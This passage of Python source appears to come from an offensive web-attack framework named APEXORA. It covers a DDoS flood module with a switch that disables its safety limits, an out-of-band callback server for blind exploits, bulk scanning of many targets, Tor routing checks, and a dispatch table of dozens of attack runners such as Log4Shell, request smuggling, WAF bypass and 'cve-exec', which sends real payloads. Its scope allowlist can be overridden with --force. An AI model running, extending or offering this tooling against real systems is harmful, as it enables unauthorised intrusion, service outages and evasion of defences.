    return results

def _ddos_classify(l3, l4, l7):
    avail = l7.get("availability_pct", 0)
    succ = l4.get("success_rate_pct", 0)
    loss = l3.get("packet_loss_pct", 0)
    if avail >= 99 and succ >= 99 and loss < 1:
        return "HEALTHY"
    if avail >= 90 and succ >= 90:
        return "DEGRADED"
    if l7.get("rate_limited") or l7.get("http_4xx", 0) > l7.get("http_2xx", 0):
        return "RATE_LIMITED"
    if 50 <= avail < 90 or 50 <= succ < 90:
        return "PARTIALLY_UNAVAILABLE"
    if avail < 50 or succ < 50:
        return "UNAVAILABLE"
    return "INCONCLUSIVE"

def _ddos_ascii_dashboard(l3, l4, l7, elapsed, duration):
    width = 78
    print()
    print(_c(C_MAG, "╔" + "═" * (width - 2) + "╗"))
    print(_c(C_MAG, "║ ") + _bold(_wht(_center("APEXORA · MULTI-LAYER DDoS SIMULATION DASHBOARD", width - 4))) + _c(C_MAG, " ║"))
    print(_c(C_MAG, "╠" + "═" * (width - 2) + "╣"))

    avail = l7.get("availability_pct", 0)
    bar_w = 30
    filled = int(bar_w * avail / 100)
    bar = "█" * filled + "░" * (bar_w - filled)
    color = C_GRN if avail >= 90 else (C_YEL if avail >= 50 else C_RED)
    print(_c(C_MAG, "║ ") + f"L7 Availability  {_c(color, bar)} {avail:.1f}%".ljust(width - 4) + _c(C_MAG, " ║"))

    print(_c(C_MAG, "║ ") + _dim("── Layer 3 (Network) ──────────────────────────────────────────") + _c(C_MAG, " ║"))
    print(_c(C_MAG, "║ ") + f"  Avg RTT: {l3['avg_rtt_ms']}ms  ·  Packet Loss: {l3['packet_loss_pct']}%  ·  Congestion: {l3['congestion']}".ljust(width - 4) + _c(C_MAG, " ║"))

    print(_c(C_MAG, "║ ") + _dim("── Layer 4 (Transport) ───────────────────────────────────────") + _c(C_MAG, " ║"))
    print(_c(C_MAG, "║ ") + f"  TCP Attempts: {l4['tcp_attempts']}  ·  Success: {l4['tcp_success']}  ·  Rate: {l4['success_rate_pct']}%".ljust(width - 4) + _c(C_MAG, " ║"))
    print(_c(C_MAG, "║ ") + f"  Resets: {l4['tcp_reset']}  ·  Timeouts: {l4['tcp_timeout']}  ·  Table Exhaustion: {l4['conn_table_exhaustion']}".ljust(width - 4) + _c(C_MAG, " ║"))

    print(_c(C_MAG, "║ ") + _dim("── Layer 7 (Application) ─────────────────────────────────────") + _c(C_MAG, " ║"))
    print(_c(C_MAG, "║ ") + f"  Requests: {l7['requests']}  ·  2xx: {l7['http_2xx']}  ·  4xx: {l7['http_4xx']}  ·  5xx: {l7['http_5xx']}".ljust(width - 4) + _c(C_MAG, " ║"))
    print(_c(C_MAG, "║ ") + f"  Median: {l7['median_ms']}ms  ·  P95: {l7['p95_ms']}ms  ·  P99: {l7['p99_ms']}ms  ·  Errors: {l7['errors']}".ljust(width - 4) + _c(C_MAG, " ║"))

    print(_c(C_MAG, "║ ") + _dim("── HTTP Status Distribution ──────────────────────────────────") + _c(C_MAG, " ║"))
    total = sum(l7.get("status_distribution", {}).values()) or 1
    for st, cnt in sorted(l7.get("status_distribution", {}).items(), key=lambda x: -x[1])[:6]:
        pct = cnt / total * 100
        b = int(pct / 100 * 30)
        print(_c(C_MAG, "║ ") + f"  {str(st).ljust(4)} {'█'*b}{'░'*(30-b)} {pct:.1f}%".ljust(width - 4) + _c(C_MAG, " ║"))

    cls = _ddos_classify(l3, l4, l7)
    sev_map = {"HEALTHY": _grn, "DEGRADED": _yel, "RATE_LIMITED": _yel,
               "PARTIALLY_UNAVAILABLE": _red, "UNAVAILABLE": _red, "INCONCLUSIVE": _cyn}
    print(_c(C_MAG, "╠" + "═" * (width - 2) + "╣"))
    print(_c(C_MAG, "║ ") + f"Classification: {sev_map.get(cls, _wht)(cls)}  ·  Elapsed: {elapsed:.0f}s/{duration}s".ljust(width - 4) + _c(C_MAG, " ║"))
    print(_c(C_MAG, "╚" + "═" * (width - 2) + "╝"))

def run_ddos(target, modules, duration=DEFAULT_DURATION, concurrency=DEFAULT_CONCURRENCY, verbose=False):
    host = urlparse(target if "://" in target else "https://" + target).hostname
    if not host:
        err("cannot parse host")
        return None
    if not host_in_scope(host):
        warn(f"target {host} not in scope")
        return None
    if DDOS_SAFETY_LIMIT:
        if duration > DDOS_MAX_DURATION:
            duration = DDOS_MAX_DURATION
            warn(f"duration clamped to safety max ({DDOS_MAX_DURATION}s)")
        if concurrency > DDOS_MAX_CONCURRENCY:
            concurrency = DDOS_MAX_CONCURRENCY
            warn(f"concurrency clamped to safety max ({DDOS_MAX_CONCURRENCY})")
    else:
        warn("DDoS safety limit DISABLED — unlimited attack enabled")
        if duration <= 0:
            duration = DEFAULT_DURATION
        if concurrency <= 0:
            concurrency = DEFAULT_CONCURRENCY
    if concurrency > SAFETY_MAX_CONCURRENCY and DDOS_SAFETY_LIMIT:
        concurrency = SAFETY_MAX_CONCURRENCY
        warn(f"concurrency clamped to safety max ({SAFETY_MAX_CONCURRENCY})")

    t0 = time.time()
    live_scan_header(target, f"ddos · modules={','.join(modules)}")
    flow_diagram([
        f"target: {host}",
        f"authorize + safety limit {'ON' if DDOS_SAFETY_LIMIT else 'OFF'} (conc<={concurrency})",
        "module A — L3 network latency + packet loss",
        "module B — L4 TCP connect + reset analysis",
        "module C — L7 HTTP request simulation",
        "classify availability state",
        "persist telemetry",
    ], C_MAG)

    l3 = _l3_assess(host, duration) if "l3" in modules else {"avg_rtt_ms":0,"packet_loss_pct":0,"congestion":"SKIPPED","latency_ms":[]}
    l4 = _l4_assess(host, duration, concurrency) if "l4" in modules else {"tcp_attempts":0,"tcp_success":0,"success_rate_pct":0,"tcp_reset":0,"tcp_timeout":0,"conn_table_exhaustion":False}
    l7 = _l7_assess(target, duration, concurrency, verbose) if "l7" in modules else {"availability_pct":0,"requests":0,"http_2xx":0,"http_4xx":0,"http_5xx":0,"timeouts":0,"errors":0,"response_times":[],"status_distribution":{},"median_ms":0,"p95_ms":0,"p99_ms":0}

    elapsed = time.time() - t0
    _ddos_ascii_dashboard(l3, l4, l7, elapsed, duration)

    cls = _ddos_classify(l3, l4, l7)
    telemetry = {
        "l3": l3, "l4": l4, "l7": l7,
        "elapsed_s": round(elapsed, 2),
        "modules": modules, "concurrency": concurrency
    }
    db_insert_ddos(target, ",".join(modules), elapsed, str(concurrency), l7.get("availability_pct", 0), cls, telemetry)
    ok(f"DDoS telemetry persisted · classification={cls}")
    return telemetry

def cmd_ddos(args):
    target = args.target
    modules = [m.strip() for m in (args.modules or "l3,l4,l7").split(",") if m.strip() in ("l3","l4","l7")]
    if not modules:
        err("no valid modules")
        return
    duration = max(5, min(getattr(args, "duration", DEFAULT_DURATION), DDOS_MAX_DURATION if DDOS_SAFETY_LIMIT else 99999))
    concurrency = max(1, min(getattr(args, "concurrency", DEFAULT_CONCURRENCY), DDOS_MAX_CONCURRENCY if DDOS_SAFETY_LIMIT else 99999))
    run_ddos(target, modules, duration, concurrency, verbose=True)

def cmd_ddos_safety(args):
    global DDOS_SAFETY_LIMIT
    mode = getattr(args, "mode", "on")
    if mode == "off":
        DDOS_SAFETY_LIMIT = False
        warn("DDoS safety limit DISABLED — unlimited attack enabled")
    elif mode == "on":
        DDOS_SAFETY_LIMIT = True
        ok("DDoS safety limit ENABLED")
    else:
        state = "ON" if DDOS_SAFETY_LIMIT else "OFF"
        info(f"DDoS safety limit: {state}")
        info(f"Max duration: {DDOS_MAX_DURATION}s")
        info(f"Max concurrency: {DDOS_MAX_CONCURRENCY}")

def cmd_rate(args):
    delay = getattr(args, "delay", None)
    jitter = getattr(args, "jitter", 0.0)
    if delay is None:
        info(f"rate delay: {_RATE_LIMITER._delay}s · jitter: {_RATE_LIMITER._jitter}s")
        return
    _RATE_LIMITER.set(float(delay), float(jitter))
    ok(f"rate limit set: delay={_RATE_LIMITER._delay}s jitter={_RATE_LIMITER._jitter}s")

def cmd_oob(args):
    action = getattr(args, "action", "status")
    if action == "start":
        host = getattr(args, "host", "0.0.0.0")
        port = getattr(args, "port", 8888)
        _OOB_SERVER.host = host
        _OOB_SERVER.port = int(port)
        _OOB_SERVER.start()
        info(f"OOB URL: {_oob_url()}")
        info("send this URL in payloads to detect blind vulnerabilities")
    elif action == "stop":
        _OOB_SERVER.stop()
        ok("OOB server stopped")
    elif action == "clear":
        _OOB_SERVER.clear()
        ok("OOB hits cleared")
    elif action == "hits":
        hits = _OOB_SERVER.get_hits()
        info(f"{len(hits)} interactions")
        for h in hits[-20:]:
            print(f"  {_dim(h['time'])}  {_grn(h['source_ip'])}  {_yel(h['method_path'][:80])}")
    else:
        state = "running" if _OOB_SERVER._running else "stopped"
        info(f"OOB server: {state} @ {_OOB_SERVER.host}:{_OOB_SERVER.port}")
        info(f"OOB URL: {_oob_url()}")
        info(f"hits: {len(_OOB_SERVER.get_hits())}")
        info("usage: oob start [--host 0.0.0.0] [--port 8888]")

def cmd_basic_auth(args):
    basic_auth_gate()

def cmd_attack_oob(args):
    target = args.target
    host = urlparse(target if "://" in target else "https://" + target).hostname or target
    if not host_in_scope(host, force=getattr(args, "force", False)):
        warn(f"target {host} not in scope — scope --add {host} first")
        return
    if not _OOB_SERVER._running:
        info("starting OOB server...")
        _OOB_SERVER.start()
        time.sleep(0.5)
    live_scan_header(target, "oob-blind")
    findings = run_oob_blind(target, verbose=True)
    for i, f in enumerate(findings, 1):
        finding_block(i, f)
    crit = "CRITICAL" if any(x.get("severity") == "CRITICAL" for x in findings) else "INFO"
    db_insert_test(target, "oob-blind", 5, findings, crit, 0.0)
    results_summary(target, "oob-blind", findings, 0.0)

def cmd_bulk(args):
    targets_file = getattr(args, "targets_file", None) or str(BULK_FILE)
    category = getattr(args, "category", "sqli") or "sqli"
    if category not in RUNNERS:
        err(f"unknown category: {category}")
        return
    if not Path(targets_file).exists():
        err(f"targets file not found: {targets_file}")
        info(f"create {targets_file} with one target per line")
        return
    targets = [l.strip() for l in Path(targets_file).read_text().splitlines() if l.strip() and not l.startswith("#")]
    if not targets:
        err("no targets in file")
        return
    ok(f"loaded {len(targets)} targets from {targets_file}")
    live_scan_header(targets[0], f"bulk · {category} · {len(targets)} targets")
    flow_diagram([
        f"{len(targets)} targets loaded",
        f"category: {category}",
        "parallel scan with thread pool",
        "aggregate findings",
        "persist bulk run",
    ], C_MAG)
    t0 = time.time()
    results = {}
    lock = threading.Lock()
    def _scan(target):
        host = urlparse(target if "://" in target else "https://" + target).hostname or target
        if not host_in_scope(host, force=getattr(args, "force", False)):
            with lock:
                results[target] = {"error": "out_of_scope", "findings": []}
            return
        try:
            runner = RUNNERS[category]
            if category == "ssti":
                findings = runner(target, "generic", verbose=False)
            else:
                findings = runner(target, verbose=False)
            with lock:
                results[target] = {"error": None, "findings": findings}
        except Exception as e:
            with lock:
                results[target] = {"error": str(e)[:200], "findings": []}
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(targets), 10)) as pool:
        futs = [pool.submit(_scan, t) for t in targets]
        for i, fut in enumerate(concurrent.futures.as_completed(futs), 1):
            progress_bar("bulk", i, len(targets), color=C_MAG)
    duration_ms = round((time.time() - t0) * 1000, 1)
    total_findings = sum(len(v.get("findings", [])) for v in results.values())
    print()
    print(_c(C_MAG, "╔" + "═" * 76 + "╗"))
    print(_c(C_MAG, "║ ") + _bold(_wht(f"BULK RESULTS · {category} · {len(targets)} targets".ljust(74))) + _c(C_MAG, " ║"))
    print(_c(C_MAG, "╠" + "═" * 76 + "╣"))
    print(_c(C_MAG, "║ ") + f"Duration: {duration_ms}ms  ·  Findings: {total_findings}".ljust(74) + _c(C_MAG, " ║"))
    print(_c(C_MAG, "╠" + "═" * 76 + "╣"))
    for target, r in results.items():
        if r.get("error"):
            print(_c(C_MAG, "║ ") + _red(f"{target[:50]:<50} ERROR: {r['error'][:20]}".ljust(74)) + _c(C_MAG, " ║"))
        else:
            n = len(r.get("findings", []))
            crit = any(f.get("severity") == "CRITICAL" for f in r.get("findings", []))
            marker = _red("CRIT") if crit else (_yel(f"{n}") if n else _grn("clean"))
            print(_c(C_MAG, "║ ") + f"{target[:50]:<50} {marker}".ljust(74) + _c(C_MAG, " ║"))
    print(_c(C_MAG, "╚" + "═" * 76 + "╝"))
    db_insert_bulk(category, targets, results, duration_ms)
    ok(f"bulk run persisted to DB")
    if getattr(args, "output", None):
        try:
            Path(args.output).write_text(json.dumps(results, indent=2))
            ok(f"results written to {args.output}")
        except Exception as e:
            err(f"write failed: {e}")

def cmd_tor(args):
    action = getattr(args, "action", "status")
    if action == "start":
        host = getattr(args, "host", "127.0.0.1")
        port = getattr(args, "port", 9050)
        try:
            s = socket.create_connection((host, int(port)), timeout=5)
            s.close()
            try:
                TOR_FILE.write_text(json.dumps({"host": host, "port": int(port), "active": True}))
            except Exception:
                pass
            ok(f"Tor SOCKS5 proxy reachable at {host}:{port}")
            info("to use Tor, set environment: export http_proxy=socks5://127.0.0.1:9050")
        except Exception as e:
            err(f"Tor SOCKS5 not reachable: {e}")
            info("start Tor: tor or torsocks")
    elif action == "status":
        active = False
        host, port = "127.0.0.1", 9050
        if TOR_FILE.exists():
            try:
                d = json.loads(TOR_FILE.read_text())
                host = d.get("host", host)
                port = d.get("port", port)
                active = d.get("active", False)
            except Exception:
                pass
        try:
            s = socket.create_connection((host, int(port)), timeout=3)
            s.close()
            active = True
        except Exception:
            active = False
        info(f"Tor proxy: {'ACTIVE' if active else 'INACTIVE'} @ {host}:{port}")
        if active:
            try:
                ip = _tor_check_ip(host, port)
                if ip:
                    info(f"Tor exit IP: {ip}")
            except Exception:
                pass
    elif action == "stop":
        try:
            TOR_FILE.unlink()
        except Exception:
            pass
        ok("Tor config cleared")

def _tor_check_ip(host, port):
    try:
        s = socket.create_connection((host, int(port)), timeout=5)
        s.sendall(b"\x05\x01\x00")
        resp = s.recv(2)
        if resp != b"\x05\x00":
            s.close()
            return None
        host_b = b"check.torproject.org"
        req = b"\x05\x01\x00\x03" + bytes([len(host_b)]) + host_b + struct.pack(">H", 80)
        s.sendall(req)
        resp = s.recv(10)
        if len(resp) < 10:
            s.close()
            return None
        if resp[1] != 0:
            s.close()
            return None
        req_http = b"GET /api/ip HTTP/1.0\r\nHost: check.torproject.org\r\n\r\n"
        s.sendall(req_http)
        data = b""
        s.settimeout(5)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except Exception:
            pass
        s.close()
        m = re.search(rb'"IP"\s*:\s*"([^"]+)"', data)
        if m:
            return m.group(1).decode()
        return None
    except Exception:
        return None

def cmd_save_all(args):
    _RECORDER.dump_all()
    ok(f"terminal session saved to {REPORT_DIR}")
    info("formats: .txt .json .xml + ALL_SESSIONS.txt + ALL_SESSIONS.json")

RUNNERS = {
    "sqli": run_sqli,
    "sqli-blind": run_sqli_blind,
    "xss": run_xss,
    "nosql": run_nosql,
    "ssti": run_ssti,
    "xxe": run_xxe,
    "ssrf": run_ssrf,
    "cmdi": run_cmdi,
    "lfi": run_lfi,
    "ldap": run_ldap_attack,
    "jwt": run_jwt_attack,
    "oauth": run_oauth_attack,
    "graphql": run_graphql_attack,
    "deser": run_deserial_deser,
    "proto-pollution": run_proto_pollution,
    "log4shell": run_log4shell,
    "spring4shell": run_spring4shell,
    "shellshock": run_shellshock,
    "crlf": run_crlf_inject,
    "hpp": run_hpp,
    "cors": run_cors_misconfig,
    "upload": run_upload_bypass,
    "ssi": run_ssi_inject,
    "fmt": run_fmt_string,
    "idor": run_idor_scan,
    "mass-assign": run_mass_assign,
    "subdomain-takeover": run_subdomain_takeover,
    "subdomain-enum": run_subdomain_enum,
    "dns-rebind": run_dns_rebind,
    "race": run_race_condition,
    "waf-bypass": run_waf_bypass,
    "waf-admin-probe": run_waf_admin_probe,
    "waf-break": run_waf_break,
    "waf-fingerprint": run_waf_fingerprint,
    "waf-timeline": run_waf_timeline,
    "cache-inject": run_cache_inject,
    "session-hijack": run_session_hijack,
    "headers-audit": run_headers_audit,
    "tls-audit": run_tls_audit,
    "h2c-smuggle": run_h2c_smuggle,
    "cl0-smuggle": run_cl0_smuggle,
    "http2-desync": run_http2_desync,
    "websocket-attack": run_websocket_attack,
    "chain-xxe-aws": run_chain_xxe_aws,
    "rl-evade": run_rl_evade,
    "origin-hunt": run_origin_hunt,
    "recon-passive": run_recon_passive,
    "recon-active": run_recon_active,
    "cve-intel": run_cve_intel,
    "cve-exec": run_cve_all,
    "php2shell": run_php2shell_analysis,
    "rule-steal": run_rule_steal,
    "js-recon": run_js_recon,
    "dom-xss": run_dom_xss,
    "postmessage": run_postmessage_bypass,
    "csp": run_csp_bypass,
    "router": run_client_router_bypass,
    "sri": run_js_supply_chain,
    "service-worker": run_service_worker_audit,
    "dom-clobbering": run_dom_clobbering,
    "oob-blind": run_oob_blind,
    "ddos": cmd_ddos,
}

ALL_CATEGORIES = sorted(RUNNERS.keys())

def _steps_for_category(category):
    flows = {
        "sqli": ["target URL", "send error payloads", "detect DBMS error sig", "classify severity"],
        "sqli-blind": ["target URL", "send blind delay payloads", "measure response time", "confirm if >4500ms"],
        "xss": ["target URL", "inject payloads in q param", "check response reflection", "classify reflection"],
        "nosql": ["target URL", "send JSON operator payloads", "detect auth bypass status change", "classify"],
        "ssti": ["target URL", "inject template expressions", "check evaluated output", "classify"],
        "xxe": ["target URL", "POST XML with entities", "detect file/credential leak", "classify"],
        "ssrf": ["target URL", "inject internal URLs", "detect internal data response", "classify"],
        "cmdi": ["target URL", "inject shell metacharacters", "detect uid/gid output", "classify"],
        "lfi": ["target URL", "inject traversal payloads", "detect /etc/passwd content", "classify"],
        "ldap": ["target URL", "inject LDAP filters", "detect LDAP error responses", "classify"],
        "jwt": ["target URL", "build alg=none tokens", "detect accepted admin JWT", "classify"],
        "oauth": ["target URL", "inject redirect_uri variants", "detect location header change", "classify"],
        "graphql": ["target URL", "send introspection queries", "detect __schema response", "classify"],
        "deser": ["target URL", "POST serialized blobs", "detect exception/500", "classify"],
        "proto-pollution": ["target URL", "POST __proto__ payloads", "detect pollute acceptance", "classify"],
        "log4shell": ["target URL", "inject JNDI headers", "detect 500 or jndi echo", "classify"],
        "spring4shell": ["target URL", "POST class.module payload", "detect endpoint accept", "classify"],
        "shellshock": ["target URL", "inject bash function in UA", "detect uid in response", "classify"],
        "crlf": ["target URL", "inject CRLF in redirect", "detect injected header", "classify"],
        "hpp": ["target URL", "send duplicate params", "detect status change", "classify"],
        "cors": ["target URL", "send Origin header", "detect reflected ACAO", "classify"],
        "upload": ["target URL", "POST multipart PHP file", "detect accept response", "classify"],
        "ssi": ["target URL", "POST SSI directives", "detect uid/root output", "classify"],
        "fmt": ["target URL", "POST format specifiers", "detect hex or 500", "classify"],
        "idor": ["target URL", "GET sequential IDs", "detect sensitive records", "classify"],
        "mass-assign": ["target URL", "POST admin fields", "detect accept response", "classify"],
        "subdomain-takeover": ["enumerate subdomains", "detect dangling CNAME", "confirm unclaimed service", "classify"],
        "subdomain-enum": ["wordlist", "DNS resolve", "record found hosts", "classify"],
        "dns-rebind": ["wildcard DNS check", "detect loopback resolution", "classify"],
        "race": ["target URL", "spawn 20 threads", "measure success count", "classify if >1"],
        "waf-bypass": ["target URL", "send obfuscated payloads", "detect reaching DB or bypass", "classify"],
        "waf-admin-probe": ["target URL", "GET admin paths", "detect panel content", "classify"],
        "waf-break": ["target URL", "send malformed giant payloads", "detect crash or ReDoS", "classify"],
        "waf-fingerprint": ["target URL", "read server header", "send probe mutations", "detect behavior change"],
        "waf-timeline": ["target URL", "escalating payloads", "record block onset index", "classify"],
        "cache-inject": ["target URL", "split path + header", "detect privileged cache", "classify"],
        "session-hijack": ["target URL", "read Set-Cookie", "check HttpOnly/Secure/SameSite", "classify"],
        "headers-audit": ["target URL", "read response headers", "check 5 security headers", "classify"],
        "tls-audit": ["target host", "TLS handshake", "read version + cipher", "classify"],
        "h2c-smuggle": ["target host", "send h2c upgrade", "detect 101 response", "classify"],
        "cl0-smuggle": ["target host", "send CL:0 + TE:chunked", "detect smuggled response", "classify"],
        "http2-desync": ["target host", "open TLS to 443", "send h2 frames", "detect response", "classify"],
        "websocket-attack": ["target host", "send WS upgrade with evil origin", "detect 101", "classify"],
        "chain-xxe-aws": ["target URL", "XXE to IMDSv1", "detect AWS keys", "classify"],
        "rl-evade": ["target URL", "run 30 RL episodes", "track Q values", "pick best mutation"],
        "origin-hunt": ["enumerate subdomains", "fetch origin IP with Host header", "compare to baseline", "classify"],
        "recon-passive": ["target URL", "GET sensitive paths", "detect exposed files", "classify"],
        "recon-active": ["target host", "TCP connect on 17 ports", "record open ports", "classify"],
        "cve-intel": ["target URL", "loop 24 CVEs", "probe HTTP ones", "classify matches"],
        "cve-exec": ["target URL", "loop 17 CVE executors", "send real payloads", "classify exploited"],
        "php2shell": ["target URL", "read X-Powered-By", "compare to vulnerable range", "classify"],
        "rule-steal": ["target URL", "send 6 feature payloads", "measure block ratio", "classify"],
        "js-recon": ["target URL", "extract scripts", "match DOM sinks/sources", "check CSP"],
        "dom-xss": ["target URL", "inject in fragment", "detect reflection", "classify"],
        "postmessage": ["target URL", "detect message listener", "check origin filter", "classify"],
        "csp": ["target URL", "read CSP header", "check unsafe-inline/eval", "classify"],
        "router": ["target URL", "detect SPA framework", "probe unauth routes", "classify"],
        "sri": ["target URL", "extract external scripts", "check SRI integrity", "classify"],
        "service-worker": ["target URL", "detect SW registration", "classify"],
        "dom-clobbering": ["target URL", "inject clobber payloads", "detect reflection", "classify"],
        "oob-blind": ["start OOB server", "inject OOB payloads", "wait for callbacks", "classify blind"],
        "ddos": ["target host", "authorize + safety clamp", "L3 latency/packet-loss probe", "L4 TCP connect probe", "L7 HTTP flood sim", "classify availability"],
    }
    return flows.get(category, ["target URL", f"run {category} module", "collect findings", "classify"])

def run_job_verbose(target, category, framework="generic"):
    if category not in RUNNERS:
        err(f"unknown category: {category}")
        return
    if category == "ddos":
        run_ddos(target, ["l3","l4","l7"], DEFAULT_DURATION, DEFAULT_CONCURRENCY, verbose=True)
        return
    if category == "oob-blind":
        cmd_attack_oob(argparse.Namespace(target=target, force=False))
        return
    host = urlparse(target if "://" in target else "https://" + target).hostname or target
    if not host_in_scope(host):
        warn(f"target {host} not in scope file — use 'scope --add {host}' first, or pass --force")
        return

    t0 = time.time()
    live_scan_header(target, category)

    step_header("1/6", "SCOPE CHECK")
    ok(f"target in scope allowlist: {host}")
    step_footer()

    step_header("2/6", "WAF FINGERPRINT")
    with Spinner("probing server headers + signature database..."):
        d = Detector()
        fp = d.detect(target)
    if fp.get("error"):
        err(f"fingerprint failed: {fp['error']}")
    elif fp["detected"]:
        warn(f"{len(fp['detected'])} WAF/CDN signature(s) matched:")
        for w in fp["detected"]:
            purpose = WAF_DESCRIPTIONS.get(w["name"], "")
            print(f"      {_yel('●')} {w['name']:<24} [{w['confidence']:<9}] {w['vendor']}")
            if purpose:
                print(f"        {_dim('purpose:')} {purpose[:150]}")
    else:
        info(f"no WAF detected (server: {fp.get('server') or 'unknown'}, HTTP {fp.get('status')})")
    step_footer()

    step_header("3/6", "EXECUTION FLOW")
    flow_diagram(_steps_for_category(category), C_MAG)
    step_footer()

    step_header("4/6", f"DISPATCH · {category.upper()}")
    runner = RUNNERS[category]
    findings = []
    try:
        if category == "ssti":
            findings = runner(target, framework, verbose=True)
        else:
            findings = runner(target, verbose=True)
    except Exception as e:
        err(f"runner crashed: {str(e)[:160]}")
        step_footer()
        return
    step_footer()

    if not isinstance(findings, list):
        findings = []

    duration_ms = round((time.time() - t0) * 1000, 1)

    step_header("5/6", "FINDINGS DETAIL")
    if not findings:
        info("no findings — target appears not vulnerable to this module")
    else:
        for i, f in enumerate(findings, 1):
            finding_block(i, f)
    step_footer()

    step_header("6/6", "PERSIST")
    pc = len(PAYLOADS.get(category, [])) if isinstance(PAYLOADS.get(category), list) else 0
    crit = "CRITICAL" if any(x.get("severity") == "CRITICAL" for x in findings) \
           else ("HIGH" if any(x.get("severity") == "HIGH" for x in findings) \
           else ("MEDIUM" if any(x.get("severity") == "MEDIUM" for x in findings) \
           else ("LOW" if any(x.get("severity") == "LOW" for x in findings) \
           else ("INFO" if findings else "NONE"))))
    db_insert_test(target, category, pc, findings, crit, duration_ms)
    ok(f"saved {len(findings)} findings to {DB_FILE}")
    step_footer()

    results_summary(target, category, findings, duration_ms)

def cmd_detect_firewall_waf(args):
    target = args.target
    host = urlparse(target if "://" in target else "https://" + target).hostname or target
    if not host_in_scope(host, force=getattr(args, "force", False)):
        warn(f"target {host} not in scope — scope --add {host} first")
        return
    print()
    step_header("DETECT-FIREWALL/WAF", f"target: {target}", C_YEL)
    with Spinner(f"fetching target and scanning {len(WAF_SIGNATURES)} WAF signatures..."):
        d = Detector()
        res = d.detect(target)
    step_footer()

    box("TARGET INFO", [
        f"{_dim('URL:')}     {res['url']}",
        f"{_dim('IP:')}      {res.get('ip') or 'N/A'}",
        f"{_dim('HTTP:')}    {res.get('status')}",
        f"{_dim('Server:')}  {res.get('server') or 'unknown'}",
        f"{_dim('Timing:')}  {res.get('timing')} ms",
        f"{_dim('Size:')}    {res.get('body_size')} bytes",
        f"{_dim('Sig DB:')}  {len(WAF_SIGNATURES)} signatures loaded",
    ], C_CYN)

    if res.get("error"):
        err(f"error: {res['error']}")
        return

    section(f"MATCHED SIGNATURES · {len(res['detected'])}", C_YEL)
    if not res["detected"]:
        info("no WAF/CDN signature matched — target appears directly exposed")
    else:
        for w in res["detected"]:
            print()
            print(f"  {_yel('●')} {_bold(w['name'])}  [{_yel(w['confidence'])}]")
            print(f"      {_dim('vendor:')}   {w['vendor']}")
            print(f"      {_dim('category:')} {w['category']}")
            purpose = WAF_DESCRIPTIONS.get(w["name"])
            if purpose:
                print(f"      {_dim('purpose:')}  {_grn(purpose)}")
            print(f"      {_dim('evidence:')} {', '.join(w['evidence'])}")

    section("MATCHED HEADERS", C_CYN)
    interesting = ["server", "x-powered-by", "cf-ray", "x-sucuri-id", "x-iinfo",
                   "x-amzn-waf", "x-akamai-transformed", "via", "x-cdn", "x-iinfo",
                   "x-sucuri-cache", "set-cookie"]
    shown = False
    for h in interesting:
        if h in res["headers"]:
            kv_line(h, res["headers"][h], C_GRN)
            shown = True
    if not shown:
        info("no interesting headers present")

    rid = db_insert_scan(res)
    if rid:
        print()
        info(f"scan #{rid} saved to {DB_FILE}")

def cmd_categories(args):
    print()
    section(f"ATTACK CATEGORIES · {len(ALL_CATEGORIES)}", C_CYN)
    width = max(len(c) for c in ALL_CATEGORIES) + 4
    for c in ALL_CATEGORIES:
        n = len(PAYLOADS.get(c, [])) if isinstance(PAYLOADS.get(c), list) else "dict"
        if c == "ddos":
            n = "multi-layer"
        if c == "oob-blind":
            n = "blind"
        print(f"  {_grn(c.ljust(width))} {_dim(str(n) + ' payloads')}")

def cmd_payloads(args):
    cat = getattr(args, "category", None)
    if cat:
        if cat not in PAYLOADS:
            err(f"unknown category: {cat}")
            return
        pls = PAYLOADS[cat]
        if isinstance(pls, dict):
            for sub, subpls in pls.items():
                section(f"{cat} → {sub} · {len(subpls)} payloads", C_CYN)
                for i, p in enumerate(subpls, 1):
                    print(f"  {_dim(str(i).rjust(3))} {_yel(str(p)[:200])}")
        else:
            section(f"{cat} · {len(pls)} payloads", C_CYN)
            for i, p in enumerate(pls, 1):
                print(f"  {_dim(str(i).rjust(3))} {_yel(str(p)[:200])}")
    else:
        section(f"PAYLOAD CATEGORIES · {len(PAYLOADS)}", C_CYN)
        for k in sorted(PAYLOADS.keys()):
            v = PAYLOADS[k]
            n = sum(len(x) for x in v.values()) if isinstance(v, dict) else len(v)
            print(f"  {_grn(k.ljust(24))} {_dim(str(n) + ' payloads')}")

def cmd_waf_list(args):
    print()
    section(f"WAF SIGNATURE DATABASE · {len(WAF_SIGNATURES)} entries", C_YEL)
    q = (getattr(args, "query", "") or "").lower()
    shown = 0
    for name, sig in sorted(WAF_SIGNATURES.items()):
        hdrs, cks, bds, vendor, cat, conf = sig
        blob = (name + " " + vendor + " " + cat).lower()
        if q and q not in blob:
            continue
        purpose = WAF_DESCRIPTIONS.get(name, "")
        print()
        print(f"  {_yel('●')} {_bold(name)}  [{conf}]")
        print(f"      {_dim('vendor:')}   {vendor}")
        print(f"      {_dim('category:')} {cat}")
        if purpose:
            print(f"      {_dim('purpose:')}  {_grn(purpose)}")
        if hdrs:
            print(f"      {_dim('headers:')}  {', '.join(hdrs)}")
        if cks:
            print(f"      {_dim('cookies:')}  {', '.join(cks)}")
        if bds:
            print(f"      {_dim('body:')}     {', '.join(bds)}")
        shown += 1
    if q and shown == 0:
        info(f"no WAF matching '{q}'")

def cmd_cve(args):
    q = (getattr(args, "query", "") or "").lower()
    print()
    section(f"CVE DATABASE · {len(CVE_DB)} entries", C_RED)
    shown = 0
    for cid, c in CVE_DB.items():
        blob = (cid + " " + c.get("product", "") + " " + c.get("type", "")).lower()
        if q and q not in blob:
            continue
        exec_marker = _grn("✓EXEC") if cid in CVE_EXECUTORS else _yel("probe")
        protocol = c.get("protocol", "http")
        kev = _red("KEV") if c.get("kev") else "   "
        rce = _red("RCE") if c.get("rce") else "---"
        print(f"  {_bold(cid.ljust(16))} {exec_marker}  {kev}  {rce}  "
              f"CVSS {str(c.get('cvss', '?')).ljust(4)}  {c.get('product', '?').ljust(22)}  "
              f"proto={protocol}")
        shown += 1
    if q and shown == 0:
        info(f"no CVE matching '{q}'")

def cmd_cve_exec(args):
    target = args.target
    cve_id = getattr(args, "cve_id", None)
    host = urlparse(target if "://" in target else "https://" + target).hostname or target
    if not host_in_scope(host, force=getattr(args, "force", False)):
        warn(f"target {host} not in scope — scope --add {host} first")
        return
    live_scan_header(target, f"cve-exec · {cve_id or 'all-17'}")
    step_header("1/2", "CVE DISPATCH")
    flow_diagram([
